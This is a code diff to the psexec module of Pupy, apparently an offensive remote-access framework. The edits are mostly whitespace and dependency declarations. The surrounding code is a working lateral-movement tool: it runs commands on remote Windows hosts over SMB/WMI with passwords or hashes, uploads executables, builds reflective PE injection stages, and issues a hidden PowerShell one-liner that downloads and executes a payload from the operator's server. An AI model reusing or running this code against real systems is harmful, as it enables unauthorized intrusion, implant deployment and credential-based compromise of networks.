@@ -1,6 +1,6 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Author: byt3bl33d3r and Shawn Evans
-# Version used from the "rewrite" branch of smbexec written by byt3bl33d3r 
+# Version used from the "rewrite" branch of smbexec written by byt3bl33d3r
 from pupylib.PupyModule import *
 from pupylib.utils.rpyc_utils import redirected_stdo
 import pupygen
@@ -21,10 +21,11 @@ __class_name__="PSExec"
 @config(cat="admin")
 class PSExec(PupyModule):
     """ Launch remote commands using smbexec or wmiexec"""
-    max_clients=1
+    max_clients = 1
+    dependencies = [ 'impacket', 'ntpath', 'calendar', 'pupyutils.psexec' ]
 
     def init_argparse(self):
-        
+
         self.arg_parser = PupyArgumentParser(prog="psexec", description=self.__doc__)
         self.arg_parser.add_argument("-u", metavar="USERNAME", dest='user', default='', help="Username, if omitted null session assumed")
         self.arg_parser.add_argument("-p", metavar="PASSWORD", dest='passwd', default='', help="Password")
@@ -43,7 +44,7 @@ class PSExec(PupyModule):
         sgroupp.add_argument('--ps1-port', default=8080, type=int, help="Custom port used by the listening server (used with --ps1-oneliner, default: 8080)")
         sgroupp.add_argument("--ps1",  action='store_true', default=False, help="Upload and execute a powershell file to get a pupy session")
         sgroupp.add_argument("--file", dest="file", default=None, help="Upload and execute an exe file")
-        
+
     def run(self, args):
 
         if "/" in args.target[0]:
@@ -51,13 +52,13 @@ class PSExec(PupyModule):
         else:
             hosts = list()
             hosts.append(args.target[0])
-        
+
         ext = ''
         remote_path = ''
         dst_folder = ''
         file_to_upload = []
         if args.file or args.ps1:
-            
+
             tmp_dir = tempfile.gettempdir()
 
             if self.client.is_windows():
@@ -65,7 +66,7 @@ class PSExec(PupyModule):
             else:
                 remote_path = '/tmp/'
 
-            # write on the temp directory 
+            # write on the temp directory
             if args.share == 'C$':
                 dst_folder = "C:\\Windows\\TEMP\\"
             # write on the root directory
@@ -98,7 +99,7 @@ class PSExec(PupyModule):
                 launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
                 open(tmp_dir + os.sep + first_stage, 'w').write(launcher)
                 self.success('first stage created: %s' % tmp_dir + os.sep + first_stage)
-                
+
                 command = getInvokeReflectivePEInjectionWithDLLEmbedded(self.client.get_conf())
                 open(tmp_dir + os.sep + second_stage, 'w').write(command)
                 self.success('second stage created: %s' % tmp_dir + os.sep + second_stage)
@@ -119,27 +120,21 @@ class PSExec(PupyModule):
             self.warning('starting the local server')
             process = Popen(cmd.split(' '), stdout=PIPE, stderr=PIPE, stdin=PIPE)
             time.sleep(2)
-            
+
             # check if the server has been launched corretly
             if process.poll():
                 self.error('the server has not been launched, check if the port %s or if the file %s/pupygen.py exists' % (str(args.ps1_port), os.getcwd()))
                 return
-            
+
             self.success('server started (pid: %s)' % process.pid)
             args.command = 'powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString(\'http://%s:%s/eiloShaegae1\')"' % (ip, str(args.ps1_port))
-
-        self.info("Loading dependencies")
-        self.client.load_package("impacket")
-        self.client.load_package('ntpath')
-        self.client.load_package("calendar")
-        self.client.load_package("pupyutils.psexec")
 
         with redirected_stdo(self.client.conn):
             for host in hosts:
                 self.info("Connecting to the remote host: %s" % host)
                 self.client.conn.modules["pupyutils.psexec"].connect(host, args.port, args.user, args.passwd, args.hash, args.share, file_to_upload, remote_path, dst_folder, args.command, args.domain, args.execm)
 
-            if args.ps1_oneliner:                
+            if args.ps1_oneliner:
                 self.warning('stopping the local server (pid: %s)' % process.pid)
                 process.terminate()
 
